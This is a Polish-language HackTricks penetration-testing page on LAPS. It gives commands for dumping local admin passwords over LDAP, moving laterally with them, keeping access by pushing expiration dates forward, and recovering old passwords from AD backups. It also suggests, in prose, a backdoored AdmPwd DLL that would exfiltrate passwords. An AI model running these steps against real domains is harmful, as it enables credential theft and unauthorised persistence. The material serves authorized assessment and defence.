# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

Obecnie podczas assessment możesz spotkać **2 warianty LAPS**:

- **Legacy Microsoft LAPS**: przechowuje hasło lokalnego administratora w **`ms-Mcs-AdmPwd`** oraz czas wygaśnięcia w **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (wbudowane w Windows od aktualizacji z kwietnia 2023): nadal może emulować tryb legacy, ale w trybie natywnym używa atrybutów **`msLAPS-*`**, wspiera **password encryption**, **password history** oraz **DSRM password backup** dla domain controllers.

LAPS jest zaprojektowany do zarządzania **local administrator passwords**, czyniąc je **unikalnymi, losowymi i często zmienianymi** na komputerach dołączonych do domain. Jeśli możesz odczytać te atrybuty, zwykle możesz **pivot jako local admin** na podatny host. W wielu środowiskach interesujące jest nie tylko samo odczytanie hasła, ale też ustalenie **komu przyznano delegowany dostęp** do atrybutów hasła.

### Legacy Microsoft LAPS attributes

W obiektach computer w domain implementacja legacy Microsoft LAPS powoduje dodanie dwóch atrybutów:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Natywny Windows LAPS dodaje kilka nowych atrybutów do obiektów computer:

- **`msLAPS-Password`**: clear-text password blob przechowywany jako JSON, gdy encryption nie jest włączone
- **`msLAPS-PasswordExpirationTime`**: zaplanowany czas wygaśnięcia
- **`msLAPS-EncryptedPassword`**: zaszyfrowane bieżące hasło
- **`msLAPS-EncryptedPasswordHistory`**: zaszyfrowana historia haseł
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: zaszyfrowane dane hasła DSRM dla domain controllers
- **`msLAPS-CurrentPasswordVersion`**: śledzenie wersji oparte na GUID używane przez nowszą logikę wykrywania rollbacku (Windows Server 2025 forest schema)

Gdy **`msLAPS-Password`** jest czytelny, wartość jest obiektem JSON zawierającym nazwę konta, czas aktualizacji i clear-text password, na przykład:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Sprawdź, czy jest aktywowany
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Dostęp do hasła LAPS

Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` i następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik do czytelnego dla człowieka formatu.

### Legacy Microsoft LAPS PowerShell cmdlets

Jeśli legacy moduł LAPS jest zainstalowany, następujące cmdlets są zwykle dostępne:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS jest dostarczany z nowym modułem PowerShell i nowymi cmdletami:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Kilka szczegółów operacyjnych ma tutaj znaczenie:

- **`Get-LapsADPassword`** automatycznie obsługuje **legacy LAPS**, **clear-text Windows LAPS** oraz **encrypted Windows LAPS**.
- Jeśli hasło jest zaszyfrowane i możesz je **odczytać**, ale nie **odszyfrować**, cmdlet zwraca metadane, takie jak **`Source`**, **`DecryptionStatus`** i **`AuthorizedDecryptor`**, nawet jeśli nie może zwrócić hasła w postaci clear-text.
- W **encrypted Windows LAPS** **read permission** i **decrypt permission** to **różne kontrole**. Sam dostęp do odczytu OU / obiektu nie oznacza automatycznie, że możesz odszyfrować **`msLAPS-EncryptedPassword`**.
- **Password history** jest dostępna tylko wtedy, gdy włączone jest **Windows LAPS encryption**.
- Na domain controllers zwrócone źródło może być **`EncryptedDSRMPassword`**.

To jest użyteczne podczas assessmentu, ponieważ pole **`AuthorizedDecryptor`** mówi, **dla którego użytkownika lub grupy blob został zaszyfrowany**, co często zamienia nieudany odczyt hasła w nowy cel do privilege-escalation.

### PowerView / LDAP

**PowerView** może być też użyte do ustalenia, **kto może odczytać hasło i je odczytać**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Jeśli **`msLAPS-Password`** jest czytelne, przeanalizuj zwrócony JSON i wyodrębnij **`p`** jako hasło oraz **`n`** jako nazwę zarządzanego lokalnego konta administratora.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
To pole **`n`** ma znaczenie w nowszych wdrożeniach, ponieważ **Windows LAPS automatic account management** może wskazywać **custom account** zamiast wbudowanego **`Administrator`**, a nowsze systemy **Windows 11 24H2 / Windows Server 2025** mogą nawet **randomize** tę nazwę konta.

### Linux / remote tooling

Nowoczesne narzędzia obsługują zarówno legacy Microsoft LAPS, jak i Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Uwagi:

- Nowsze buildy **NetExec** wspierają **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** oraz **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** nadal jest przydatny dla **legacy Microsoft LAPS** z poziomu Linux, ale obsługuje tylko **`ms-Mcs-AdmPwd`**.
- Nowsze cross-platform tooling, takie jak **`LAPS4LINUX`**, tooling oparte na **`dpapi-ng`** oraz aktualne workflows **NetExec** mogą też obsługiwać **native Windows LAPS** z hostów innych niż Windows.
- Jeśli środowisko używa **encrypted Windows LAPS**, zwykły odczyt LDAP nie wystarczy; musisz też być **authorized decryptor** (albo mieć równoważny materiał do deszyfrowania, taki jak offline domain DPAPI-NG root key material).
- Na **Windows 11 24H2 / Windows Server 2025** nie zakładaj, że zarządzany lokalny admin to zawsze **`Administrator`**. Automatic account management może utworzyć własne konto i opcjonalnie zrandomizować jego nazwę, więc najpierw ustal nazwę konta przez **`n`** / **`Account`** zanim użyjesz **`--laps`** na dużą skalę.

### Directory synchronization abuse

Jeśli masz domain-level prawa **directory synchronization** zamiast bezpośredniego read access na każdym obiekcie komputera, LAPS nadal może być interesujący.

Połączenie **`DS-Replication-Get-Changes`** z **`DS-Replication-Get-Changes-In-Filtered-Set`** lub **`DS-Replication-Get-Changes-All`** może być użyte do synchronizacji atrybutów **confidential / RODC-filtered** takich jak legacy **`ms-Mcs-AdmPwd`**. BloodHound modeluje to jako **`SyncLAPSPassword`**. Sprawdź [DCSync](dcsync.md) po background dotyczący replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) ułatwia enumerację LAPS za pomocą kilku funkcji.\
Jedną z nich jest parsowanie **`ExtendedRights`** dla **wszystkich komputerów z włączonym LAPS.** Pokazuje to **grupy** specjalnie **delegowane do odczytu haseł LAPS**, którymi często są użytkownicy w protected groups.\
**Konto**, które **dołączyło komputer** do domeny, otrzymuje `All Extended Rights` nad tym hostem, a to prawo daje **kontu** możliwość **odczytu haseł**. Enumeration może ujawnić konto użytkownika, które może odczytać hasło LAPS na hoście. Może to pomóc nam **namierzyć konkretne użytkowniki AD**, którzy mogą odczytywać hasła LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Zrzucanie haseł LAPS za pomocą NetExec / CrackMapExec

Jeśli nie masz interaktywnego PowerShell, możesz nadużyć tego uprawnienia zdalnie przez LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
To zrzuca wszystkie sekrety LAPS, które użytkownik może odczytać, umożliwiając laterally movement z innym lokalnym hasłem administratora.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Data wygaśnięcia

Gdy już masz admin, możliwe jest **pozyskanie haseł** i **uniemożliwienie** maszynie **aktualizowania** swojego **hasła** poprzez **ustawienie daty wygaśnięcia na przyszłość**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS używa zamiast tego **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Hasło nadal zostanie zrotowane, jeśli **admin** użyje **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, albo jeśli włączono **Do not allow password expiration time longer than required by policy**.

### Zastrzeżenie dotyczące rollbacku snapshotów w nowszym Windows LAPS

Starsze triki z rollbackiem snapshotu / obrazu są **mniej niezawodne** wobec nowszych wdrożeń **Windows LAPS**. Na **Windows 11 24H2 / Windows Server 2025**, jeśli schemat lasu zawiera **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), klient porównuje lokalnie zbuforowany GUID z wartością zapisaną w AD i **natychmiast rotuje hasło**, gdy rollback tworzy **torn state**.

W praktyce oznacza to, że persistence oparte na snapshotach albo próby przywrócenia starszego, znanego hasła lokalnego admina mogą szybko spłonąć zamiast przetrwać do następnego normalnego wygaśnięcia.

Ta ochrona dotyczy tylko **AD-backed Windows LAPS** i nadal zależy od tego, czy przywrócona maszyna może **uwierzytelnić się z powrotem do AD**. Jeśli maszyna nie może już komunikować się z AD, **password history** albo **AD backup access** mogą nadal uratować sytuację.

### Zastrzeżenie dotyczące manipulacji automatycznym zarządzaniem kontem

Gdy włączone jest **automatic account management**, Windows LAPS kontroluje cykl życia zarządzanego lokalnego konta admina. Nieoczekiwane próby zmiany nazwy, rekonfiguracji lub innej manipulacji tym kontem mogą zostać odrzucone z **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, więc persistence zależna od cichej modyfikacji zarządzanego konta LAPS jest mniej niezawodna na nowszych endpointach.

### Odzyskiwanie historycznych haseł z kopii zapasowych AD

Gdy włączone jest **Windows LAPS encryption + password history**, zamontowane kopie zapasowe AD mogą stać się dodatkowym źródłem secretów. Jeśli możesz uzyskać dostęp do zamontowanego snapshotu AD i użyć **recovery mode**, możesz odpytać starsze zapisane hasła bez kontaktu z działającym DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
To jest najbardziej istotne podczas **AD backup theft**, **offline forensics abuse** lub **disaster-recovery media access**.

### Backdoor

Oryginalny kod źródłowy dla legacy Microsoft LAPS można znaleźć [tutaj](https://github.com/GreyCorbel/admpwd), dlatego możliwe jest umieszczenie backdoor w kodzie (na przykład wewnątrz metody `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs`), który w jakiś sposób **wyekfiltrowałby nowe hasła lub przechowywał je gdzieś**.

Następnie skompiluj nowy `AdmPwd.PS.dll` i wgraj go na maszynę do `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (oraz zmień czas modyfikacji).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
